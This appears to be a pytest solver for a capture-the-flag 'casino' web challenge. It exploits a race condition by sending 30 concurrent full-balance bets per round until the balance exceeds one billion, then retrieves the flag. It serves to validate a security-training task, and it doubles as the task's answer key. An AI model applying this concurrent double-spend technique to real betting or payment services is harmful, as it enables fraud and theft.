import uuid
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest
import requests

from toolbox.utils.test_utils import RequestHelper, check_flag_in_response, check_status_code, load_flag_hash

task_path = Path(__file__).parent.parent
TASK_HOST = "casino.hack4krak.pl"
CONCURRENT_BETS = 30
MAX_ROUNDS = 40


def _register_and_login(request: RequestHelper) -> requests.Session:
    username = f"user_{uuid.uuid4().hex[:10]}"
    password = "password1234"
    session = requests.Session()
    session.headers.update({"Host": TASK_HOST})

    res = session.post(f"{request.base_url}/register", data={"username": username, "password": password})
    assert res.status_code in (200, 302), f"Register failed: {res.status_code}"

    return session


def _get_balance(session: requests.Session, base_url: str) -> int:
    res = session.get(f"{base_url}/info", timeout=5)
    check_status_code(res)
    return res.json()["balance"]


def _send_concurrent_bets(session: requests.Session, base_url: str, guess: str, bet: int) -> list[dict]:
    client_seed = "a" * 64

    def place_bet(_):
        return session.post(
            f"{base_url}/bet",
            data={"clientSeed": client_seed, "guess": guess, "bet": str(bet)},
            timeout=10,
        ).json()

    with ThreadPoolExecutor(max_workers=CONCURRENT_BETS) as ex:
        return list(ex.map(place_bet, range(CONCURRENT_BETS)))


@pytest.mark.timeout(120)
def test_race_condition_reaches_billion():
    request = RequestHelper(default_host=TASK_HOST)
    session = _register_and_login(request)

    for _ in range(MAX_ROUNDS):
        balance = _get_balance(session, request.base_url)
        if balance > 1_000_000_000:
            break
        if balance <= 0:
            session = _register_and_login(request)
            balance = 1000

        bet = max(1, balance)
        _send_concurrent_bets(session, request.base_url, "1", bet)

    balance = _get_balance(session, request.base_url)
    assert balance > 1_000_000_000, f"Balance {balance} did not exceed 1 billion after {MAX_ROUNDS} rounds"


@pytest.mark.timeout(120)
def test_flag_returned_when_balance_exceeds_billion():
    request = RequestHelper(default_host=TASK_HOST)
    session = _register_and_login(request)

    for _ in range(MAX_ROUNDS):
        balance = _get_balance(session, request.base_url)
        if balance > 1_000_000_000:
            break
        if balance <= 0:
            session = _register_and_login(request)

        bet = max(1, balance)
        _send_concurrent_bets(session, request.base_url, "1", bet)

    res = session.get(f"{request.base_url}/flag", timeout=5)
    check_status_code(res)
    flag_hash = load_flag_hash(task_path)
    check_flag_in_response(res, expected_hash=flag_hash)
